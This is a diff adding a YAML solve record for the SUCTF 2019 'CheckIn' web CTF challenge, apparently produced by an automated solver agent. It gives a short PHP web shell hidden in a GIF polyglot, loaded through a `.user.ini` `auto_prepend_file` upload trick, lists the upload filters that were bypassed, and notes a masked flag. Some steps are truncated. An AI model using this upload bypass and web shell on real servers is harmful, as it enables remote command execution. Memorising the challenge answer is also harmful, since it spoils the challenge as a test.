@@ -1,0 +1,27 @@
+name: '[SUCTF 2019]CheckIn'
+category: web
+keywords:
+- suctf
+- checkin
+- github
+- team
+- tree
+- master
+- web
+steps:
+- '[codex] RCE on target via `.user.ini` + GIF polyglot: upload `.user.ini` (body
+  `GIF89a\nauto_prepend_file=p.gif\n`) then `p.gif` (`GIF89a` + `<script language="php">system($_GET["cmd"]);</script>`)
+  into the s'
+- '[codex] Upload filters: any `<?` after offset 0 is rejected ("<? in contents!"),
+  `phar`/`php*` suffixes rejected ("illegal suffix!"), filename containing `<?` rejected;
+  `.user.ini` must be uploaded before any'
+- '[codex] PHP 5.6.40, `WEB_DOCUMENT_ROOT=/app`, upload dir mapping per client IP
+  (`5ce48d30…`, `fb2808b0…`, `9f104d6d…`); `/` contains `flag` with mode `0644`, so
+  `cat /flag` works as `application`. PoC saved a'
+- '[codex] FOUND_FLAG=<FLAG>'
+- Native Worker completed a bounded evidence-backed observation
+evidence_chain:
+- '[codex] FOUND_FLAG=<FLAG>'
+success_format: CTF2\{[^}]+\}
+source: 9c4bd17a-eecc-4fd3-8fbf-14b2202a571d (solver 4ed3ffcc-51f0-4bb4-bf0d-cad1b3002b54)
+notes: ''
